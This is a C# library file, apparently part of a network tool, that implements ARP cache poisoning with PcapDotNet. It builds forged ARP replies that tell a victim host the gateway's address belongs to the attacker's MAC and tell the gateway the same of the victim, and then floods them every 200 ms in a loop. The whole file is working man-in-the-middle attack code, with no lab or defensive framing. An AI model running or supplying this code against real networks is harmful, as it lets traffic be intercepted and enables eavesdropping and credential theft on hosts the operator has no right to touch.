using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using PcapDotNet;

using LibInterface;
using PcapDotNet.Packets;
using PcapDotNet.Packets.Ethernet;
using PcapDotNet.Packets.Arp;
using System.Text.RegularExpressions;
using System.Net;
using PcapDotNet.Base;


using LibInterface;
using PcapDotNet.Core;
using System.Threading;

namespace LibArpPoisoning
{
    public class ArpPoisoning
    {
        List<ArpRecord> targets;



        Device outputDevice;
        PacketCommunicator communicator;
        bool stopPoisoning = false;


        public ArpPoisoning(Device networkInterface)
        {
            targets = new List<ArpRecord>();
            outputDevice = networkInterface;
        }

        public void AddTarget(IPAddress targetIp, string targetMac,IPAddress gatewayIp,string gatewayMac)
        {
            ArpRecord target = new ArpRecord
            (
                 outputDevice.ip,
                 outputDevice.MacAddress,
                 targetIp,
                 targetMac,
                 gatewayIp,
                 gatewayMac
            );


            //to target as gateway 
            target.pcks.Add(
                        ArpGenerator(
                            target.SenderMAC, 
                            target.TargetMAC, 

                            target.SenderMAC, 
                            target.GatewayIP, 
                            target.TargetMAC, 
                            target.TargetIP, 
                            false));

            //to gateway as target 
            target.pcks.Add(
                       ArpGenerator(
                           target.SenderMAC, 
                           target.GatewayMAC, 
                           target.SenderMAC, 
                           target.TargetIP, 
                           target.GatewayMAC,
                           target.GatewayIP, 
                           false));

            targets.Add(target);
        }

   

        public async void StartPoisoning()
        {
            if (!stopPoisoning)
                stopPoisoning = true;

            if(communicator == null )
                communicator = outputDevice.NetworkDevice.Open(65536, PacketDeviceOpenAttributes.Promiscuous, 1000);

            stopPoisoning = false ;
            await Task.Run(() =>
            {
                do
                {
                    //Console.WriteLine("test");
                    foreach (ArpRecord record in targets)
                    {
                        foreach (Packet pck in record.pcks)
                        {
                        
                            communicator.SendPacket(pck);
                        }
                    }
                    Thread.Sleep(200);
                }
                while (!stopPoisoning);
            });
        }
        public void StopPoisoning()
        {
            stopPoisoning = true;
        }
        public void ClearTargets()
        {
            targets.Clear();
        }



        Packet ArpGenerator(string EthernetSourceMac, string EthernetDestinatonMac,string SenderMacAddress, IPAddress SenderIpAddress, string DestinatonMacAddress , IPAddress DestinationIpAddress, bool isRequest)
        {


            EthernetSourceMac = ValidMac(EthernetSourceMac);
            EthernetDestinatonMac = ValidMac(EthernetDestinatonMac);


            EthernetLayer ethernetLayer =
                    new EthernetLayer
                    {
                        Source = new MacAddress(EthernetSourceMac),
                        Destination = new MacAddress(EthernetDestinatonMac),
                        EtherType = EthernetType.None,
                    };

            SenderMacAddress = ValidMac(SenderMacAddress);
            DestinatonMacAddress = ValidMac(DestinatonMacAddress);

            ArpLayer arpLayer =
                new ArpLayer
                {
                    ProtocolType = EthernetType.IpV4,
                    Operation = isRequest ? ArpOperation.Request : ArpOperation.Reply,
                    SenderHardwareAddress = SenderMacAddress.Split(':').Select(x => Convert.ToByte(x, 16)).ToArray().AsReadOnly(),
                    SenderProtocolAddress = SenderIpAddress.GetAddressBytes().AsReadOnly(),
                    TargetHardwareAddress = DestinatonMacAddress.Split(':').Select(x => Convert.ToByte(x, 16)).ToArray().AsReadOnly(),
                    TargetProtocolAddress = DestinationIpAddress.GetAddressBytes().AsReadOnly(),
                };

            PacketBuilder builder = new PacketBuilder(ethernetLayer, arpLayer);

            return builder.Build(DateTime.Now);

        }

        string ValidMac(string mac)
        {

            if (mac.Contains(":"))           //if Mac Address with this Format XX:XX:XX:XX:XX:XX
                return mac;
            else if (mac.Contains("-"))      //if Mac Address with this Format XX-XX-XX-XX-XX-XX
                return mac.Replace("-", ":");
            else                              //if Mac Address with this Format XXXXXXXXXXXX
            {
                return Regex.Replace(mac, ".{2}", "$0:").Substring(0, 17);
            }
        }

    }




}
